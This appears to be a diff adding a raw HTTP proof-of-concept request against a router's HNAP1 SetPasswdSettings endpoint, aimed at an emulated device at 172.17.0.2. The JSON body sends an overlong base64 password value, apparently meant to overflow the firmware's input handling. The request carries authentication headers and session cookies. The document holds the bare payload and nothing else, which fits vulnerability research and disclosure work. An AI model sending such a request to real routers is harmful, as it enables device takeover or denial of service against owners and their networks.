@@ -1,0 +1,16 @@
+POST /HNAP1/ HTTP/1.1
+Host: 172.17.0.2
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
+Accept: application/json
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+SOAPACTION: "http://purenetworks.com/HNAP1/SetPasswdSettings"
+HNAP_AUTH: 86C459D6153ADC8C276C6600A10A2B67 1677494640286
+Content-Length: 217
+Origin: http://172.17.0.2
+Connection: keep-alive
+Referer: http://172.17.0.2/account.html?t=1677494611403
+Cookie: PHPSESSID=7bd4dcd91dfa377b871938417f3cfae0; timeout=0; uid=mSERbVyD; PrivateKey=A51ECD0D3D365890DB1C911830A850A3
+
+{"SetPasswdSettings":{"current_password":"UEg5dTNBRjk=","new_password":"UEg5dTNBRjlNVEV4TVRFeE1URXhNVEV4TVRFeE1URXhNVEV4TVRFeE1URT0=","confirm_password":"UEg5dTNBRjlNVEV4TVRFeE1URXhNVEV4TVRFeE1URXhNVEV4TVRFeE1URT0="}}
